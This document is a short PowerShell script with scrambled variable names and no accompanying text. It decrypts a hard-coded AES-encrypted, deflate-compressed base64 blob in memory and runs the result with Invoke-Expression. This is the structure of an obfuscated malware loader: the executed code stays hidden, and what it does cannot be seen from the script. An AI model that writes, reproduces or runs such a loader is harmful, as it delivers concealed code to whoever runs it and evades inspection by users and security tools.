$kuqw = New-Object "System.Security.Cryptography.AesManaged"
$qake = [System.Convert]::FromBase64String("zFgl4eiZ4r5sNeJCwdgDFMQoabnr5apguhANYtZE08Xms7vEs8m7GEKRzu6cnGfN6gv96K6wfe7n/XnFmX6dJc6r/W4YzzubknODT9/NLoCNx/yaDPtKWjvzWiABPvnSVZ2SQoF2Uae0s1M2MENeUDixP6uYE8TyvGJuSMxC4c7xO0cWNeAPkE8jxN7IFCSGU3aBcjSuRYjCBrJXvJHICzHNDz98U4qMlJ/+ebtTWbPu8eu5A0FwCqHL4UVuw2ixzVqBdBo5aFSdd+PR28PZzjGHX94Eh9UBt8fq43shfV1/1pcqo9sLOXYj9cdknvF0xgyRzSwNc5HExEhNwRY75i8rcxdYCpS3SBv11jEO32BraLIsKsUWU3IO7hlb+d0UvwGaMjG5vvaKY/GFJlP4gEVWqruujcdjHVRAWWHjZCAYVRkm2jxvBRYQ7cW0AVWn7P+kukk2iH4Nnn/kjHk1iiM9lNcT/GeO1LYcAD86SIWVoAW42+mJD2uWbrFij+hZKWziJiCzM32tNFzig3zysn0UVMhKRQU0GW/hh4sOpD9uma3AVgZ8kBYhPq2R55VALT42SjWGrLa+WfLT8rF0hg5NEJ/vG8XfLK0M38aJl3f6OclDeQXeFS1/LIGpS0+xV/zPWMXnFEhySir66DVLFHTt1Xe3oOEKi4y/kKdmfhwSX8is9wWaKNb6KHr2VLqBRu+x9HNDoyYn1OC3k5WoTflS/A9kEp73IOYL774I2JCuxnmERXo0JGAuwTchq7o2yQV0eASwlj1PWgCmFJFhTKWxRncy4hS8h1I8dwQ2joz/4C216A+uAfjb9QmEMDeLecOrLGUJCj3dpbEMiL/OfTL5ki2NxCPbsPw3Bcz0LGTtT1WJLJDf5ysggdtmi7XxFQktBdoViv+oLPBODYWQrOLrCBz/hyyOEenrobxlr9z0Gv+vcm5wsh/cDcWdNrQtR8fAwKLD+POB36y16eLUtKcxj6KcVHGbt486DxWwHPF0sXPyydUqpzmTCFMXI4OmYB8/+Fx6LZSsddT60mJMRug7m4f1SX9coFqTH4Tn5cIHrXTcKqgLrJYNZNINEI4oArjkP/mROMJrLURgeLis5Rwdh3vL5psTojWuL7Otp4QpUJS8tLY1pTbzlykq4qE7oUqVObexm/WeQQ0UJKV/DZEThNYlP1mzPF0RGSsDrdCGpuKGx0a/vBbg/3WMY787CaJSK/N0wdJ+oxHgCXXtPibA9M+6w+xCr4vjXvmEY/Lf1AmO0wKUjsuDR+If4aDkP58pd5JSq1M0QuWUZ7jedzzZHSzg9CIkTI8czbkBQUKDZXw8GvZav2Q6G0jAHuWscerEqLPdkq4sgG5EUJs6H1giZAUeAmx5QExIzJYo5oN/fykxsAVeFsBbC7cEsKzCjzc2xjyAc1myRWeGudLhRw==")
$wvnhoqjuu = [System.Convert]::FromBase64String("6hk/c/hU7drIk7QMGK0iPaKTDCzz/QtIg4Tn4q4ToYY=")
$kuqw.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
$kuqw.IV = $qake[0..15]
$kuqw.Mode = [System.Security.Cryptography.CipherMode]::ECB
$kuqw.BlockSize = 128
$kuqw.KeySize = 192
$kuqw.Key = $wvnhoqjuu
$hxgragsiu = New-Object System.IO.MemoryStream
$krsjtq = New-Object System.IO.MemoryStream(,$kuqw.CreateDecryptor().TransformFinalBlock($qake,16,$qake.Length-16))
$xjktiap = New-Object System.IO.Compression.DeflateStream $krsjtq, ([IO.Compression.CompressionMode]::Decompress)
$xjktiap.CopyTo($hxgragsiu)
$xjktiap.Close()
$krsjtq.Close()
$kuqw.Dispose()
$mybtrkw = [System.Text.Encoding]::UTF8.GetString($hxgragsiu.ToArray())
Invoke-Expression($mybtrkw)
